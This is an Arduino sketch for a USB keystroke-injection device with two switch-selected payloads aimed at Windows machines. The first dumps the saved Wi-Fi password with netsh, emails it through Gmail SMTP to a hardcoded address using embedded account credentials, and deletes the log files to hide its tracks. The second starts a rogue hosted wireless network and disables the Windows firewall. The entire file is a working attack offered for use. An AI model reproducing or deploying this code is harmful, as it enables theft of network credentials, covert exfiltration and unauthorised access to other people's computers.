//0000 = WifiGrabber
//0001 = WifiBackdoor


#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void WifiGrabber(){
  delay(3000);

  // --> Minimize all windows
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();

  // --> Open cmd
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("cmd");

  typeKey(KEY_RETURN);

  delay(200);

  // --> Getting SSID
  Keyboard.print("cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=:\" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A");

  typeKey(KEY_RETURN);

  Keyboard.print("set A=\"%A:~1%\"");

  typeKey(KEY_RETURN);

  // --> Creating A.txt
  Keyboard.print("netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt");

  typeKey(KEY_RETURN);

  // --> Get network type
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A");

  typeKey(KEY_RETURN);

  // --> Get authentication
  Keyboard.print("for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A");

  typeKey(KEY_RETURN);

  // --> Get password
  Keyboard.print("for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A");

  typeKey(KEY_RETURN);

  // --> Delete A.txt
  Keyboard.print("del A.txt");

  typeKey(KEY_RETURN);

  // --> Create Log.txt
  Keyboard.print("echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt");

  typeKey(KEY_RETURN);

  // --> Mail Log.txt
  Keyboard.print("powershell");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPServer = 'smtp.gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.EnableSsl = $true");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('kennysemailaddress@gmail.com', 'fQQmTAHf$u)3')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail = New-Object System.Net.Mail.MailMessage");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.From = 'ACCOUNT@gmail.com'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.To.Add('kennysemailaddress@gmail.com')");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Subject = 'WiFi'");

  typeKey(KEY_RETURN);

  Keyboard.print("$ReportEmail.Body = (Get-Content Log.txt | out-string)");

  typeKey(KEY_RETURN);

  Keyboard.print("$SMTPInfo.Send($ReportEmail)");

  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  delay(1000);

  // --> Delete Log.txt and exit
  Keyboard.print("del Log.txt & exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

void WifiBackdoor(){
  
  delay(500);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(200);

  Keyboard.print("cmd");

  delay(1000);

  typeKey(KEY_RETURN);

  delay(200);

  Keyboard.print("netsh wlan set hostednetwork mode=allow ssid=noobcake key=password");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh wlan start hostednetwork");

  typeKey(KEY_RETURN);

  delay(100);

  Keyboard.print("netsh firewall set opmode disable");

  typeKey(KEY_RETURN);

  Keyboard.print("exit");

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

void setup() { 
  String dip = ""; // Name of the file that will be opened

  // Sets the given pins as switches for the dip switches
  pinMode(6, INPUT_PULLUP);
  pinMode(7, INPUT_PULLUP);
  pinMode(8, INPUT_PULLUP);
  pinMode(9, INPUT_PULLUP);
  
  // Switches are checked, dip string is contructed
  if (digitalRead(6) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(7) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(8) == LOW){dip += "1";} else {dip += "0";}
  if (digitalRead(9) == LOW){dip += "1";} else {dip += "0";}
  
  Keyboard.begin();
  delay(500);
  if (dip == "0000"){
    WifiGrabber();
  }
  if (dip =="0001"){
    WifiBackdoor();
  }
}

void loop() {
}
